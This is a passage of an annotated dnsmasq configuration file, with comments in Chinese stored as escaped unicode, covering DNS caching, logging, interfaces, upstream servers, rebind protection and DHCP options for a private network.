\u4f8b\u5982\uff0c/etc/hosts\u4e2d\u7684os01\u5c06\u6269\u5c55\u6210os01.example.com\n#expand-hosts\n\n##############################################################################\n# \u7f13\u5b58\u65f6\u95f4\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u9700\u8981\u8bbe\u7f6e\n# \u672c\u5730 hosts \u6587\u4ef6\u7684\u7f13\u5b58\u65f6\u95f4\uff0c\u901a\u5e38\u4e0d\u8981\u6c42\u7f13\u5b58\u672c\u5730\uff0c\u8fd9\u6837\u66f4\u6539hosts\u6587\u4ef6\u540e\u5c31\u5373\u65f6\u751f\u6548\u3002\n#local-ttl=3600\n# \u540c local-ttl \u4ec5\u5f71\u54cd DHCP \u79df\u7ea6\n#dhcp-ttl=&lt;time&gt;\n# \u5bf9\u4e8e\u4e0a\u6e38\u8fd4\u56de\u7684\u503c\u6ca1\u6709ttl\u65f6\uff0cdnsmasq\u7ed9\u4e00\u4e2a\u9ed8\u8ba4\u7684ttl\uff0c\u4e00\u822c\u4e0d\u9700\u8981\u8bbe\u7f6e\uff0c\n#neg-ttl=&lt;time&gt;\n# \u6307\u5b9a\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u7684ttl\u65f6\u95f4\uff0c\u4e00\u822c\u4e0d\u9700\u8981\u8bbe\u7f6e\n#max-ttl=&lt;time&gt;\n# \u8bbe\u7f6e\u5728\u7f13\u5b58\u4e2d\u7684\u6761\u76ee\u7684\u6700\u5927 TTL\u3002\n#max-cache-ttl=&lt;time&gt;\n# \u4e0d\u9700\u8981\u8bbe\u7f6e\uff0c\u9664\u975e\u4f60\u77e5\u9053\u4f60\u5728\u505a\u4ec0\u4e48\u3002\n#min-cache-ttl=&lt;time&gt;\n# \u4e00\u822c\u4e0d\u9700\u8981\u8bbe\u7f6e\n#auth-ttl=&lt;time&gt;\n##############################################################################\n# \u8bb0\u5f55dns\u67e5\u8be2\u65e5\u5fd7\uff0c\u5982\u679c\u6307\u5b9a log-queries=extra \u90a3\u4e48\u5728\u6bcf\u884c\u5f00\u59cb\u5904\u90fd\u6709\u989d\u5916\u7684\u65e5\u5fd7\u4fe1\u606f\u3002\n#log-queries\n# \u8bbe\u7f6e\u65e5\u5fd7\u8bb0\u5f55\u5668\uff0c'-' \u4e3a stderr\uff0c\u4e5f\u53ef\u4ee5\u662f\u6587\u4ef6\u8def\u5f84\u3002\u9ed8\u8ba4\u4e3a\uff1aDAEMON\uff0c\u8c03\u8bd5\u65f6\u4f7f\u7528 LOCAL0\u3002\n#log-facility=&lt;facility&gt;\n#log-facility=/var/log/dnsmasq/dnsmasq.log\n# \u5f02\u6b65log\uff0c\u7f13\u89e3\u963b\u585e\uff0c\u63d0\u9ad8\u6027\u80fd\u3002\u9ed8\u8ba4\u4e3a5\uff0c\u6700\u5927100\u3002\n#log-async[=&lt;lines&gt;]\n#log-async=50\n\n##############################################################################\n# \u6307\u5b9a\u7528\u6237\u548c\u7ec4\n#user=nobody\n#group=nobody\n\n##############################################################################\n# \u6307\u5b9aDNS\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba453\uff0c\u8bbe\u7f6e port=0 \u5c06\u5b8c\u5168\u7981\u7528 DNS \u529f\u80fd\uff0c\u4ec5\u4f7f\u7528 DHCP/TFTP\n#port=53\n# \u6307\u5b9a EDNS.0 UDP \u5305\u7684\u6700\u5927\u5c3a\u5bf8\uff0c\u9ed8\u8ba4\u4e3a RFC5625 \u63a8\u8350\u7684 edns-packet-max=4096\n#edns-packet-max=&lt;size&gt;\n# \u6307\u5b9a\u5411\u4e0a\u6e38\u67e5\u8be2\u7684 UDP \u7aef\u53e3\uff0c\u9ed8\u8ba4\u662f\u968f\u673a\u7aef\u53e3\uff0c\u6307\u5b9a\u540e\u964d\u4f4e\u5b89\u5168\u6027\u3001\u52a0\u5feb\u901f\u5ea6\u3001\u51cf\u5c11\u8d44\u6e90\u6d88\u8017\u3002\n# \u8bbe\u7f6e\u4e3a '0' \u7531\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u3002\n#query-port=53535\n# \u6307\u5b9a\u5411\u4e0a\u6e38\u67e5\u8be2\u7684 UDP \u7aef\u53e3\u8303\u56f4\uff0c\u65b9\u4fbf\u9632\u706b\u5899\u8bbe\u7f6e\u3002\n#min-port=&lt;port&gt;\n#max-port=&lt;port&gt;\n# \u6307\u5b9a\u63a5\u53e3\uff0c\u6307\u5b9a\u540e\u540c\u65f6\u9644\u52a0 lo \u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7528'*'\u901a\u914d\u7b26\u3002\n# \u4e0d\u80fd\u4f7f\u7528\u63a5\u53e3\u522b\u540d\uff08\u4f8b\u5982\uff1a\"eth1:0\"\uff09\uff0c\u8bf7\u7528 listen-address \u9009\u9879\u66ff\u4ee3\u3002\n#interface=wlp2s0\n# \u6307\u5b9a\u6392\u9664\u7684\u63a5\u53e3\uff0c\u6392\u9664\u4f18\u5148\u7ea7\u9ad8\uff0c\u53ef\u4ee5\u4f7f\u7528'*'\u901a\u914d\u7b26\n#except-interface=\n# \u4ec5\u63a5\u53d7\u540c\u4e00\u5b50\u7f51\u7684 DNS \u8bf7\u6c42\u3002\n# \u4ec5\u5728\u672a\u6307\u5b9a interface\u3001except-interface\u3001listen-address \u6216\u8005 auth-server \u65f6\u6709\u6548\u3002\n#local-service\n# \u6307\u5b9a\u4e0d\u63d0\u4f9b DHCP \u6216 TFTP \u670d\u52a1\u7684\u63a5\u53e3\uff0c\u4ec5\u63d0\u4f9b DNS \u670d\u52a1\u3002\n#no-dhcp-interface=enp3s0\n# \u6307\u5b9aIP\u5730\u5740\uff0c\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\u3002\n# interface \u9009\u9879\u548c listen-address \u9009\u9879\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u3002\n# \u4e0b\u9762\u4e24\u884c\u4e0e\u6307\u5b9a interface \u9009\u9879\u7684\u4f5c\u7528\u7c7b\u4f3c\u3002\nlisten-address=192.168.10.17\n#listen-address=127.0.0.1\n# \u901a\u5e38\u60c5\u51b5\u4e0b\u5373\u4f7f\u8bbe\u7f6e\u4e86 interface \u9009\u9879\uff08\u4f8b\u5982\uff1ainterface=wlp2s0 \uff09\n# \u5c06\u4ecd\u7136\u7ed1\u5b9a\u5230\u901a\u914d\u7b26\u5730\u5740\uff08\u4f8b\u5982\uff1a*:53 \uff09\u3002\n# \u5f00\u542f\u6b64\u9879\u5c06\u4ec5\u76d1\u542c\u6307\u5b9a\u7684\u63a5\u53e3\u3002\n# \u9002\u7528\u4e8e\u5728\u540c\u4e00\u4e3b\u673a\u7684\u4e0d\u540c\u63a5\u53e3\u6216 IP \u5730\u5740\u4e0a\u8fd0\u884c\u591a\u4e2a dns \u670d\u52a1\u5668\u3002\nbind-interfaces\n# \u5bf9\u4e8e\u65b0\u6dfb\u52a0\u7684\u63a5\u53e3\u4e0d\u8fdb\u884c\u7ed1\u5b9a\u3002\u4ec5 Linux \u7cfb\u7edf\u652f\u6301\uff0c\u5176\u4ed6\u7cfb\u7edf\u7b49\u540c\u4e8e bind-interfaces \u9009\u9879\u3002\n#bind-dynamic\n\n##############################################################################\n# \u5982\u679c hosts \u4e2d\u7684\u4e3b\u673a\u6709\u591a\u4e2a IP \u5730\u5740\uff0c\u4ec5\u8fd4\u56de\u5bf9\u5e94\u5b50\u7f51\u7684 IP \u5730\u5740\u3002\nlocalise-queries\n# \u5982\u679c\u53cd\u5411\u67e5\u627e\u7684\u662f\u79c1\u6709\u5730\u5740\u4f8b\u5982192.168.X.X\uff0c\u4ec5\u4ece hosts \u6587\u4ef6\u67e5\u627e\uff0c\u4e0d\u518d\u8f6c\u53d1\u5230\u4e0a\u6e38\u670d\u52a1\u5668\n#bogus-priv\n# \u5bf9\u4e8e\u4efb\u4f55\u88ab\u89e3\u6790\u5230\u6b64 IP \u7684\u57df\u540d\uff0c\u5c06\u54cd\u5e94 NXDOMAIN \u4f7f\u5176\u89e3\u6790\u5931\u6548\uff0c\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\n# \u901a\u5e38\u7528\u4e8e\u5bf9\u4e8e\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u57df\u540d\uff0c\u7981\u6b62\u5176\u8df3\u8f6c\u5230\u8fd0\u8425\u5546\u7684\u5e7f\u544a\u7ad9\u70b9\u3002\n#bogus-nxdomain=64.94.110.11\n# \u5ffd\u7565\u5305\u542b\u6307\u5b9a\u5730\u5740\u7684 A \u8bb0\u5f55\u67e5\u8be2\u7684\u56de\u590d\u3002\n# \u4f8b\u5982\u4e0a\u6e38\u6709\u53f0 dns \u670d\u52a1\u5668\u4f2a\u9020 www.baidu.com \u7684 IP \u4e3a 1.1.1.1 \u5e76\u4e14\u54cd\u5e94\u901f\u5ea6\u975e\u5e38\u5feb\u3002\n# \u6307\u5b9a ignore-address=1.1.1.1 \u53ef\u4ee5\u5ffd\u7565\u5b83\u7684\u54cd\u5e94\u4fe1\u606f\uff0c\n# \u4ece\u800c\u7b49\u5f85 www.baidu.com \u6b63\u786e\u7684\u67e5\u8be2\u7ed3\u679c\u3002\n#ignore-address=&lt;ipaddr&gt;\nfilterwin2k\n\n##############################################################################\n# \u6307\u5b9a resolv-file \u6587\u4ef6\u8def\u5f84\uff0c\u9ed8\u8ba4/etc/resolv.conf\n#resolv-file=/etc/resolv.conf\n# \u4e0d\u8bfb\u53d6 resolv-file \u6765\u786e\u5b9a\u4e0a\u6e38\u670d\u52a1\u5668\n#no-resolv\n# \u5728\u7f16\u8bd1\u65f6\u9700\u8981\u542f\u7528 DBus \u652f\u6301\u3002\n#enable-dbus[=&lt;service-name&gt;]\n# \u4e25\u683c\u6309\u7167resolv.conf\u4e2d\u7684\u987a\u5e8f\u8fdb\u884c\u67e5\u627e\n#strict-order\n# \u5411\u6240\u6709\u4e0a\u6e38\u670d\u52a1\u5668\u53d1\u9001\u67e5\u8be2\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u3002\nall-servers\n# \u542f\u7528\u8f6c\u53d1\u5faa\u73af\u68c0\u6d4b\n#dns-loop-detect\n\n##############################################################################\n# \u8fd9\u9879\u5b89\u5168\u8bbe\u7f6e\u662f\u62d2\u7edd\u89e3\u6790\u5305\u542b\u79c1\u6709 IP \u5730\u5740\u7684\u57df\u540d\uff0c\n# \u8fd9\u4e9bIP\u5730\u5740\u5305\u62ec\u5982\u4e0b\u79c1\u6709\u5730\u5740\u8303\u56f4\uff1a10.0.0.0/8\u3001172.16.0.0/12\u3001192.168.0.0/16\u3002\n# \u5176\u521d\u8877\u662f\u8981\u9632\u6b62\u7c7b\u4f3c\u4e0a\u6e38DNS\u670d\u52a1\u5668\u6545\u610f\u5c06\u67d0\u4e9b\u57df\u540d\u89e3\u6790\u6210\u7279\u5b9a\u79c1\u6709\u5185\u7f51IP\u800c\u52ab\u6301\u7528\u6237\u8fd9\u6837\u7684\u5b89\u5168***\u3002\n# \u76f4\u63a5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u9500 stop-dns-rebind \u914d\u7f6e\u9879\u4ece\u800c\u7981\u7528\u8be5\u529f\u80fd\u3002\n# \u8fd9\u4e2a\u65b9\u6cd5\u786e\u5b9e\u53ef\u4ee5\u4e00\u52b3\u6c38\u9038\u7684\u89e3\u51b3\u89e3\u6790\u5185\u7f51 IP \u5730\u5740\u7684\u95ee\u9898\uff0c\n# \u4f46\u662f\u6211\u4eec\u4e5f\u5931\u53bb\u4e86\u8fd9\u9879\u5b89\u5168\u4fdd\u62a4\u7684\u7279\u6027\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u6211\u4e0d\u63a8\u8350\u8fd9\u4e2a\u529e\u6cd5\u3002\n# \u4f7f\u7528 rebind-domain-ok \u8fdb\u884c\u7279\u5b9a\u914d\u7f6e\uff0c\u987e\u540d\u601d\u4e49\u8be5\u914d\u7f6e\u9879\u53ef\u4ee5\u6709\u9009\u62e9\u7684\u5ffd\u7565\u57df\u540d\u7684 rebind \u884c\u4e3a\nstop-dns-rebind\nrebind-localhost-ok\n#rebind-domain-ok=[&lt;domain&gt;]|[[/&lt;domain&gt;/[&lt;domain&gt;/]\nrebind-domain-ok=/.test.com/\n\n##############################################################################\n# \u4e5f\u4e0d\u8981\u68c0\u6d4b /etc/resolv.conf \u7684\u53d8\u5316\n#no-poll\n# \u91cd\u542f\u540e\u6e05\u7a7a\u7f13\u5b58\nclear-on-reload\n# \u5b8c\u6574\u7684\u57df\u540d\u624d\u5411\u4e0a\u6e38\u670d\u52a1\u5668\u67e5\u627e\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e3b\u673a\u540d\u4ec5\u67e5\u627ehosts\u6587\u4ef6\ndomain-needed\n\n##############################################################################\n# IP\u5730\u5740\u8f6c\u6362\n#alias=[&lt;old-ip&gt;]|[&lt;start-ip&gt;-&lt;end-ip&gt;],&lt;new-ip&gt;[,&lt;mask&gt;]\n##############################################################################\n#local=[/[&lt;domain&gt;]/[domain/]][&lt;ipaddr&gt;[#&lt;port&gt;][@&lt;source-ip&gt;|&lt;interface&gt;[#&lt;port&gt;]]\n#server=[/[&lt;domain&gt;]/[domain/]][&lt;ipaddr&gt;[#&lt;port&gt;][@&lt;source-ip&gt;|&lt;interface&gt;[#&lt;port&gt;]]\nserver=/test.com/192.168.10.117\nserver=/10.168.192.in-addr.arpa/192.168.10.117\n#rev-server=&lt;ip-address&gt;/&lt;prefix-len&gt;,&lt;ipaddr&gt;[#&lt;port&gt;][@&lt;source-ip&gt;|&lt;interface&gt;[#&lt;port&gt;]]\n# \u5c06\u4efb\u4f55\u5c5e\u4e8e &lt;domain&gt; \u57df\u540d\u89e3\u6790\u6210\u6307\u5b9a\u7684 &lt;ipaddr&gt; \u5730\u5740\u3002\n# \u4e5f\u5c31\u662f\u5c06 &lt;domain&gt; \u53ca\u5176\u6240\u6709\u5b50\u57df\u540d\u89e3\u6790\u6210\u6307\u5b9a\u7684 &lt;ipaddr&gt; IPv4 \u6216\u8005 IPv6 \u5730\u5740\uff0c\u901a\u5e38\u7528\u4e8e\u5c4f\u853d\u7279\u5b9a\u7684\u57df\u540d\u3002\n# \u4e00\u6b21\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2a IPv4 \u6216\u8005 IPv6 \u5730\u5740\uff0c\u8981\u540c\u65f6\u8fd4\u56de IPv4 \u548cIPv6 \u5730\u5740\uff0c\u8bf7\u591a\u6b21\u6307\u5b9a address= \u9009\u9879\u3002\n# \u6ce8\u610f\uff1a /etc/hosts \u4ee5\u53ca DHCP \u79df\u7ea6\u5c06\u8986\u76d6\u6b64\u9879\u8bbe\u7f6e\u3002\n#address=/&lt;domain&gt;/[domain/][&lt;ipaddr&gt;]\n#ipset=/&lt;domain&gt;/[domain/]&lt;ipset&gt;[,&lt;ipset&gt;]\n#mx-host=&lt;mx name&gt;[[,&lt;hostname&gt;],&lt;preference&gt;]\n#mx-target=&lt;hostname&gt;\n\n# SRV \u8bb0\u5f55\n#srv-host=&lt;_service&gt;.&lt;_prot&gt;.[&lt;domain&gt;],[&lt;target&gt;[,&lt;port&gt;[,&lt;priority&gt;[,&lt;weight&gt;]]]]\n# A, AAAA \u548c PTR \u8bb0\u5f55 \n#host-record=&lt;name&gt;[,&lt;name&gt;....],[&lt;IPv4-address&gt;],[&lt;IPv6-address&gt;][,&lt;TTL&gt;]\n\n# TXT \u8bb0\u5f55\n#txt-record=&lt;name&gt;[[,&lt;text&gt;],&lt;text&gt;]\n# PTR \u8bb0\u5f55 \n#ptr-record=&lt;name&gt;[,&lt;target&gt;]\n#naptr-record=&lt;name&gt;,&lt;order&gt;,&lt;preference&gt;,&lt;flags&gt;,&lt;service&gt;,&lt;regexp&gt;[,&lt;replacement&gt;]\n\n# CNAME \u522b\u540d\u8bb0\u5f55\n#cname=&lt;cname&gt;,&lt;target&gt;[,&lt;TTL&gt;]\n#dns-rr=&lt;name&gt;,&lt;RR-number&gt;,[&lt;hex data&gt;]\n#interface-name=&lt;name&gt;,&lt;interface&gt;[/4|/6]\n#synth-domain=&lt;domain&gt;,&lt;address range&gt;[,&lt;prefix&gt;]\n#add-mac[=base64|text]\n#add-cpe-id=&lt;string&gt;\n#add-subnet[[=[&lt;IPv4 address&gt;/]&lt;IPv4 prefix length&gt;][,[&lt;IPv6 address&gt;/]&lt;IPv6 prefix length&gt;]]\n\n#############################################################################\n# \u7f13\u5b58\u6761\u6570\uff0c\u9ed8\u8ba4\u4e3a150\u6761\uff0ccache-size=0 \u7981\u7528\u7f13\u5b58\u3002\ncache-size=1000\n# \u4e0d\u7f13\u5b58\u672a\u77e5\u57df\u540d\u7f13\u5b58\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bdnsmasq\u7f13\u5b58\u672a\u77e5\u57df\u540d\u5e76\u76f4\u63a5\u8fd4\u56de\u4e3a\u5ba2\u6237\u7aef\u3002\nno-negcache\n# \u6307\u5b9aDNS\u540c\u5c5e\u67e5\u8be2\u8f6c\u53d1\u6570\u91cf\ndns-forward-max=1000\n\n##############################################################################\n#dnssec\n#trust-anchor=[&lt;class&gt;],&lt;domain&gt;,&lt;key-tag&gt;,&lt;algorithm&gt;,&lt;digest-type&gt;,&lt;digest&gt;\n#dnssec-check-unsigned\n#dnssec-no-timecheck\n#dnssec-timestamp=&lt;path&gt;\n#proxy-dnssec\n#dnssec-debug\n\n#############################################################################\n#auth-server=&lt;domain&gt;,&lt;interface&gt;|&lt;ip-address&gt;\n#auth-zone=&lt;domain&gt;[,&lt;subnet&gt;[/&lt;prefix length&gt;][,&lt;subnet&gt;[/&lt;prefix length&gt;].....]]\n#auth-zone=&lt;domain&gt;[,&lt;interface name&gt;[/6|/4][,&lt;interface name&gt;[/6|/4].....]]\n#auth-soa=&lt;serial&gt;[,&lt;hostmaster&gt;[,&lt;refresh&gt;[,&lt;retry&gt;[,&lt;expiry&gt;]]]]\n#auth-sec-servers=&lt;domain&gt;[,&lt;domain&gt;[,&lt;domain&gt;...]]\n#auth-peer=&lt;ip-address&gt;[,&lt;ip-address&gt;[,&lt;ip-address&gt;...]]\n# \u542f\u7528\u8fde\u63a5\u8ddf\u8e2a\uff0c\u8bfb\u53d6 Linux \u5165\u6808 DNS \u67e5\u8be2\u8bf7\u6c42\u7684\u8fde\u63a5\u8ddf\u8e2a\u6807\u8bb0\uff0c\n# \u5e76\u4e14\u5c06\u4e0a\u6e38\u8fd4\u56de\u7684\u54cd\u5e94\u4fe1\u606f\u8bbe\u7f6e\u540c\u6837\u7684\u6807\u8bb0\u3002\n# \u7528\u4e8e\u5e26\u5bbd\u63a7\u5236\u548c\u9632\u706b\u5899\u90e8\u7f72\u3002\n# \u6b64\u9009\u9879\u5fc5\u987b\u5728\u7f16\u8bd1\u65f6\u542f\u7528 conntrack \u652f\u6301\uff0c\u5e76\u4e14\u5185\u6838\u6b63\u786e\u914d\u7f6e\u5e76\u52a0\u8f7d conntrack\u3002\n# \u6b64\u9009\u9879\u4e0d\u80fd\u4e0e query-port \u540c\u65f6\u4f7f\u7528\u3002\n#conntrack\n\n##############################################################################\n#\n#        DHCP \u9009\u9879\n#\n##############################################################################\n# \u8bbe\u7f6e DHCP \u5730\u5740\u6c60\uff0c\u540c\u65f6\u542f\u7528 DHCP \u529f\u80fd\u3002\n# IPv4 &lt;mode&gt; \u53ef\u6307\u5b9a\u4e3a static|proxy \uff0c\u5f53 &lt;mode&gt; \u6307\u5b9a\u4e3a static \u65f6\uff0c\n# \u9700\u7528 dhcp-host \u624b\u52a8\u5206\u914d\u5730\u5740\u6c60\u4e2d\u7684 IP \u5730\u5740\u3002\n# \u5f53 &lt;mode&gt; \u6307\u5b9a\u4e3a proxy \u65f6\uff0c\u4e3a\u6307\u5b9a\u7684\u5730\u5740\u6c60\u63d0\u4f9b DHCP \u4ee3\u7406\u3002\n#dhcp-range=[tag:&lt;tag&gt;[,tag:&lt;tag&gt;],][set:&lt;tag&gt;,]&lt;start-addr&gt;[,&lt;end-addr&gt;][,&lt;mode&gt;][,&lt;netmask&gt;[,&lt;broadcast&gt;]][,&lt;lease time&gt;]\n#dhcp-range=172.16.0.2,172.16.0.250,255.255.255.0,1h\n#dhcp-range=192.168.10.150,192.168.10.180,static,255.255.255.0,1h\n# \u6839\u636e MAC \u5730\u5740\u6216 id \u56fa\u5b9a\u5206\u914d\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u3001\u4e3b\u673a\u540d\u3001\u79df\u671f\u3002\n# IPv4 \u4e0b\u6307\u5b9a id:* \u5c06\u5ffd\u7565 DHCP \u5ba2\u6237\u7aef\u7684 ID \uff0c\u4ec5\u6839\u636e MAC \u6765\u8fdb\u884c IP \u5730\u5740\u5206\u914d\u3002\n# \u5728\u8bfb\u53d6 /etc/hosts \u7684\u60c5\u51b5\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e /etc/hosts \u4e2d\u7684\u4e3b\u673a\u540d\u5206\u914d\u5bf9\u5e94 IP \u5730\u5740\u3002\n# \u6307\u5b9a ignore \u5c06\u5ffd\u7565\u6307\u5b9a\u5ba2\u6237\u7aef\u5f97 DHCP \u8bf7\u6c42\u3002\n#dhcp-host=[&lt;hwaddr&gt;],id:&lt;client_id&gt;|*][,set:&lt;tag&gt;][,&lt;ipaddr&gt;][,&lt;hostname&gt;][,&lt;lease_time&gt;][,ignore]\n#dhcp-hostsfile=&lt;path&gt;\n#dhcp-hostsdir=&lt;path&gt;\n# \u8bfb\u53d6 /etc/ethers \u6587\u4ef6 \u4e0e\u4f7f\u7528 dhcp-host \u7684\u4f5c\u7528\u76f8\u540c\u3002IPv6 \u65e0\u6548\u3002\n#read-ethers\n# \u6307\u5b9a\u7ed9 DHCP \u5ba2\u6237\u7aef\u7684\u9009\u9879\u4fe1\u606f\uff0c\n# \u9ed8\u8ba4\u60c5\u51b5\u4e0b dnsmasq \u5c06\u53d1\u9001\uff1a\u5b50\u7f51\u63a9\u7801\u3001\u5e7f\u64ad\u5730\u5740\u3001DNS \u670d\u52a1\u5668\u5730\u5740\u3001\u7f51\u5173\u5730\u5740\u3001\u57df\u7b49\u4fe1\u606f\u3002\n# \u6307\u5b9a\u6b64\u9009\u9879\u4e5f\u53ef\u8986\u76d6\u8fd9\u4e9b\u9ed8\u8ba4\u503c\u5e76\u4e14\u8bbe\u7f6e\u5176\u4ed6\u9009\u9879\u503c\u3002\n# \u91cd\u8981\uff1a\u53ef\u4ee5\u4f7f\u7528 option:&lt;option-name&gt;\u6216\u8005 option\u53f7 \u6765\u6307\u5b9a\u3002\n# &lt;option-name&gt; \u548c option\u53f7\u7684\u5bf9\u5e94\u5173\u7cfb\u53ef\u4f7f\u7528\u547d\u4ee4\uff1a\n# dnsmasq --help dhcp \u4ee5\u53ca dnsmasq --help dhcp6 \u67e5\u770b\uff0c\u8fd9\u70b9\u5f88\u91cd\u8981\u3002\n# \u4f8b\u5982\u8bbe\u7f6e\u7f51\u5173\u53c2\u6570\uff0c\u65e2\u53ef\u4ee5\u4f7f\u7528 dhcp-option=3,192.168.4.4 \u4e5f\u53ef\u4ee5\u4f7f\u7528 dhcp-option = option:router,192.168.4.4\u3002\n# 0.0.0.0 \u610f\u5473\u7740\u5f53\u524d\u8fd0\u884c dnsmasq \u7684\u4e3b\u673a\u5730\u5740\u3002\n# \u5982\u679c\u6307\u5b9a\u4e86\u591a\u4e2a tag:&lt;tag&gt; \u5fc5\u987b\u540c\u65f6\u5339\u914d\u624d\u884c\u3002\n# [encap:&lt;opt&gt;,][vi-encap:&lt;enterprise&gt;,][vendor:[&lt;vendor-class&gt;],] \u6709\u5f85\u7ee7\u7eed\u7814\u7a76\u3002\n#dhcp-option=[tag:&lt;tag&gt;,[tag:&lt;tag&gt;,]][encap:&lt;opt&gt;,][vi-encap:&lt;enterprise&gt;,][vendor:[&lt;vendor-class&gt;],][&lt;opt&gt;|option:&lt;opt-name&gt;|option6:&lt;opt&gt;|option6:&lt;opt-name&gt;],[&lt;value&gt;[,&lt;value&gt;]]\n#dhcp-option-force=[tag:&lt;tag&gt;,[tag:&lt;tag&gt;,]][encap:&lt;opt&gt;,][vi-encap:&lt;enterprise&gt;,][vendor:[&lt;vendor-class&gt;],]&lt;opt&gt;,[&lt;value&gt;[,&lt;value&gt;]]\n#dhcp-optsfile=&lt;path&gt;\n#dhcp-optsdir=&lt;path&gt;\n#dhcp-option=3,1.2.3.4\n#dhcp-option=option:router,1.2.3.4\n#dhcp-option=option:router,192.168.10.254\n#dhcp-option=option:dns-server,192.168.10.254,221.12.1.227,221.12.33.227\n\n##############################################################################\n# (IPv4 only) \u7981\u7528\u91cd\u7528\u670d\u52a1\u5668\u540d\u79f0\u548c\u6587\u4ef6\u5b57\u6bb5\u4f5c\u4e3a\u989d\u5916\u7684 dhcp-option \u9009\u9879\u3002\n# \u4e00\u822c\u60c5\u51b5\u4e0b dnsmasq \u4ece dhcp-boot \u79fb\u51fa\u542f\u52a8\u670d\u52a1\u5668\u548c\u6587\u4ef6\u4fe1\u606f\u5230 dhcp-option \u9009\u9879\u4e2d\u3002\n# \u8fd9\u4f7f\u5f97\u5728 dhcp-option \u9009\u9879\u5c01\u5305\u4e2d\u6709\u989d\u5916\u7684\u9009\u9879\u7a7a\u95f4\u53ef\u7528\uff0c\u4f46\u662f\u4f1a\u4f7f\u8001\u7684\u5ba2\u6237\u7aef\u6df7\u6dc6\u3002\n# \u6b64\u9009\u9879\u5c06\u5f3a\u5236\u4f7f\u7528\u7b80\u5355\u5e76\u5b89\u5168\u7684\u65b9\u5f0f\u6765\u907f\u514d\u6b64\u7c7b\u60c5\u51b5\u3002\u53ef\u4ee5\u8ba4\u4e3a\u662f\u4e00\u4e2a\u517c\u5bb9\u6027\u9009\u9879\u3002\n#dhcp-no-override\n\n##############################################################################\n# \u914d\u7f6e DHCP \u4e2d\u7ee7\u3002\n# &lt;local address&gt; \u662f\u8fd0\u884c dnsmasq \u7684\u63a5\u53e3\u7684 IP \u5730\u5740\u3002\n# \u6240\u6709\u5728 &lt;local address&gt; \u63a5\u53e3\u4e0a\u63a5\u6536\u5230\u7684 DHCP \u8bf7\u6c42\u5c06\u4e2d\u7ee7\u5230 &lt;server address&gt; \u6307\u5b9a\u7684\u8fdc\u7a0b DHCP \u670d\u5668\u3002\n# \u53ef\u4ee5\u591a\u6b21\u914d\u7f6e\u6b64\u9009\u9879\uff0c\u4f7f\u7528\u540c\u4e00\u4e2a &lt;local address&gt; \u8f6c\u53d1\u5230\u591a\u4e2a\u4e0d\u540c\u7684 &lt;server address&gt; \u6307\u5b9a\u7684\u8fdc\u7a0b DHCP\u670d\u52a1\u5668\u3002\n# &lt;server address&gt; \u4ec5\u5141\u8bb8\u4f7f\u7528 IP \u5730\u5740\uff0c\u4e0d\u80fd\u4f7f\u7528\u57df\u540d\u7b49\u5176\u4ed6\u683c\u5f0f\u3002\n# \u5982\u679c\u662f DHCPv6\uff0c&lt;server address&gt; \u53ef\u4ee5\u662f ALL_SERVERS \u7684\u591a\u64ad\u5730\u5740 ff05::1:3 \u3002\n# \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5fc5\u987b\u6307\u5b9a\u63a5\u53e3 &lt;interface&gt; \uff0c\u4e0d\u80fd\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u7528\u4e8e\u76f4\u63a5\u591a\u64ad\u5230\u5bf9\u5e94\u7684 DHCP \u670d\u52a1\u5668\u6240\u5728\u7684\u63a5\u53e3\u3002\n# &lt;interface&gt; \u6307\u5b9a\u4e86\u4ec5\u5141\u8bb8\u63a5\u6536\u4ece &lt;interface&gt; \u63a5\u53e3\u7684 DHCP \u670d\u52a1\u5668\u76f8\u5e94\u4fe1\u606f\u3002\n#dhcp-relay=&lt;local address&gt;,&lt;server address&gt;[,&lt;interface&gt;]\n\n##############################################################################\n# \u8bbe\u7f6e\u6807\u7b7e\n#dhcp-vendorclass=set:&lt;tag&gt;,[enterprise:&lt;IANA-enterprise number&gt;,]&lt;vendor-class&gt;\n#dhcp-userclass=set:&lt;tag&gt;,&lt;user-class&gt;\n#dhcp-mac=set:&lt;tag&gt;,&lt;MAC address&gt;\n#dhcp-circuitid=set:&lt;tag&gt;,&lt;circuit-id&gt;\n#dhcp-remoteid=set:&lt;tag&gt;,&lt;remote-id&gt;\n#dhcp-subscrid=set:&lt;tag&gt;,&lt;subscriber-id&gt;\n#dhcp-match=set:&lt;tag&gt;,&lt;option number&gt;|option:&lt;option name&gt;|vi-encap:&lt;enterprise&gt;[,&lt;value&gt;]\n#tag-if=set:&lt;tag&gt;[,set:&lt;tag&gt;[,tag:&lt;tag&gt;[,tag:&lt;tag&gt;]]]\n#dhcp-proxy[=&lt;ip addr&gt;]......\n\n##############################################################################\n# \u4e0d\u5206\u914d\u5339\u914d\u8fd9\u4e9b tag:&lt;tag&gt; \u7684 DHCP \u8bf7\u6c42\u3002\n#dhcp-ignore=tag:&lt;tag&gt;[,tag:&lt;tag&gt;]\n#dhcp-ignore-names[=tag:&lt;tag&gt;[,tag:&lt;tag&gt;]]\n#dhcp-generate-names=tag:&lt;tag&gt;[,tag:&lt;tag&gt;]\n# IPv4 only \u4f7f\u7528\u5e7f\u64ad\u4e0e\u5339\u914d tag:&lt;tag&gt; \u7684\u5ba2\u6237\u7aef\u901a\u4fe1\u3002\u4e00\u822c\u7528\u4e8e\u517c\u5bb9\u8001\u7684 BOOT \u5ba2\u6237\u7aef\u3002\n#dhcp-broadcast[=tag:&lt;tag&gt;[,tag:&lt;tag&gt;]] \n\n##############################################################################\n# IPv4 only \u8bbe\u7f6e DHCP \u670d\u52a1\u5668\u8fd4\u56de\u7684 